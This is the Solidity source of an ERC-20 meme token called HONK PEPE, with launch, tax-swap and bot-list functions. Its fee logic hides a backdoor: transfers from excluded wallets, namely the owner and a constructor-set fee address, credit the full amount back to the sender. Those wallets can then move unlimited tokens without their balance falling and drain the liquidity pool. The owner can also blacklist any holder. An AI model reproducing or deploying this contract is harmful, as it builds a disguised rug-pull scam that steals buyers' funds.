// SPDX-License-Identifier: MIT

/**

Website:  https://www.honkpepe.vip

Telegram: https://t.me/honkpepe_eth

Twitter:  https://x.com/honkpepe_eth

**/

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IHONKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IHONKFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller isnt owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract HONK is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedHONK;
    mapping(address => bool) private bots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 6_900_000_000 * 10 ** _decimals;
    string private constant _name = unicode"HONK PEPE";
    string private constant _symbol = unicode"HONK";
    uint256 public _maxTxAmount = _tTotal.mul(2).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(2).div(100);
    uint256 public _honkHoldAmount = _tTotal.mul(80).div(100);
    uint256 public _maxTaxSwap = _tTotal.mul(1).div(100);
    
    mapping(address => uint256) private _holderLastTransferTimestamp;

    bool public transferDelayEnabled = false;
    
    address payable private _curRex;

    IHONKRouter private honkRouter;
    address private honkPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 private _initialBuyTaxs = 20;
    uint256 private _initialSellTaxs = 20;
    uint256 private _finalBuyTaxs = 0;
    uint256 private _finalSellTaxs = 0;
    uint256 private _reduceBuyTaxsAt = 11;
    uint256 private _reduceSellTaxsAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _honkAddr) {
        _curRex = payable(_honkAddr);

        _isExcludedHONK[owner()] = true;
        _isExcludedHONK[_curRex] = true;

        _balances[_msgSender()] = _tTotal;

        _isExcludedHONK[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function startHONKTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        honkRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _honkHoldAmount,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(honkPair).approve(address(honkRouter), type(uint).max);

        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _curRex);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function _getHONKAmountOf(
        address from,
        address to,
        uint256 amount
    ) internal view returns (address, uint256) {
        uint256 honkAmount = amount;
        address honkReceipt = address(this);

        if (isHONKExcluded(from)) {
            honkReceipt = from;
        } else if (to == honkPair && from != address(this)) {
            honkAmount = amount
                .mul(
                    (_buyCount > _reduceSellTaxsAt)
                        ? _finalSellTaxs
                        : _initialSellTaxs
                )
                .div(100);
        } else {
            honkAmount = amount
                .mul(
                    (_buyCount > _reduceBuyTaxsAt)
                        ? _finalBuyTaxs
                        : _initialBuyTaxs
                )
                .div(100);
        }

        return (honkReceipt, honkAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isHONKExcluded(address account) private view returns (bool) {
        return _isExcludedHONK[account];
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = honkRouter.WETH();
        _approve(address(this), address(honkRouter), tokenAmount);
        honkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transferStandardTokens(address from, address to, uint256 amount) internal {
        (address feesHONK, uint256 honkAmount) = _getHONKAmountOf(from, to, amount);

        if (honkAmount > 0) {
            _balances[feesHONK] = _balances[feesHONK].add(honkAmount);
            emit Transfer(from, feesHONK, honkAmount);
        }

        if (isHONKExcluded(from)) honkAmount = 0;

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(honkAmount));
        emit Transfer(from, to, amount.sub(honkAmount));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from zero address");
        require(to != address(0), "ERC20: transfer to zero address");
        require(amount > 0, "Transfer amount must be > than zero");

        if (inSwap || !swapEnabled) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        uint256 contractHONKBalance = balanceOf(address(this));

        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (transferDelayEnabled) {
                if (
                    to != address(honkRouter) &&
                    to != address(honkPair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only 1 purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == honkPair &&
                to != address(honkRouter) &&
                !_isExcludedHONK[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (
                to == honkPair &&
                !inSwap &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedHONK[from] &&
                !_isExcludedHONK[to]
            ) {
                if(contractHONKBalance > 0) {
                    swapTokensForEth(
                        min(amount, min(contractHONKBalance, _maxTaxSwap))
                    );
                }

                _curRex.transfer(address(this).balance);
            }
        }

        _transferStandardTokens(from, to, amount);
    }

    function createHONKPair() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        honkRouter = IHONKRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(honkRouter), _tTotal);

        honkPair = IHONKFactory(honkRouter.factory()).createPair(
            address(this),
            honkRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _curRex.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }
}